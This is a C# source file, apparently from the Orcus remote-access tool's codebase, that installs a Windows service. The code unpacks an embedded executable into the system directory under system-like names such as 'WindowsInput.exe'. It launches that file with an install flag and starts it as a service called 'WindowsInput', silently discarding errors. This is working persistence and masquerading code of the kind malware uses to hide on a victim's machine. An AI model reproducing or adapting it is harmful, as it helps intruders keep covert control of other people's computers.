using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using Orcus.Extensions;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Service
{
    internal class ServiceInstaller
    {
        public static void InstallIfNotExist()
        {
            Program.WriteLine("Begin service installation");
            var serviceExists = ServiceController.GetServices().Any(s => s.ServiceName == "WindowsInput");
            if (!serviceExists)
            {
                Program.WriteLine("Orcus service was not found");
                try
                {
                    var file = GetFreeFilename();
                    Program.WriteLine("Free file name found for: " + file.FullName);

                    try
                    {
                        ResourceHelper.WriteGZippedResourceToFile(file.FullName, "Orcus.Service.exe.gz");
                        AppConfigWriter.WriteAppConfig(file);
                    }
                    catch (Exception)
                    {
                        return;
                    }

                    Program.WriteLine("Service was written to the file; Start service with parameter --install");

                    var process = Process.Start(file.FullName, "--install");
                    process?.WaitForExit(20000);
                    Program.WriteLine("20 seconds are gone or the service installation process did exit");

                    Program.WriteLine("Attempt to start service...");
                    try
                    {
                        StartService("WindowsInput", 5000);
                    }
                    catch (Exception ex)
                    {
                        Program.WriteLine("Start failed: " + ex.Message);
                    }
                }
                catch (Exception)
                {
                    // Unauthorized exception perhaps...
                }
            }
        }

        public static void Uninstall()
        {
            if (!ServiceConnection.Current.IsConnected)
                return;

            if (!User.IsAdministrator)
                return;

            var fileInfo = new FileInfo(ServiceConnection.Current.Pipe.GetPath());
            if (fileInfo.Exists)
            {
                var process = Process.Start(fileInfo.FullName, "--uninstall");
                process.WaitForExit();
                fileInfo.Delete();
            }
        }

        private static FileInfo GetFreeFilename()
        {
            var filenames = new[] {"WindowsInput.exe", "WinInput.exe", "WinInp.exe", "Input.exe"};
            var systemPath = EnvironmentExtensions.SystemDirectory;
            for (int i = 0; i < filenames.Length; i++)
            {
                var file = new FileInfo(Path.Combine(systemPath, filenames[i]));
                if (!file.Exists)
                    return file;
            }
            return new FileInfo(FileExtensions.MakeUnique(Path.Combine(systemPath, filenames[0])));
        }

        public static void StartService(string serviceName, int timeoutMilliseconds)
        {
            using (ServiceController service = new ServiceController(serviceName))
            {
                var timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
            }
        }
    }
}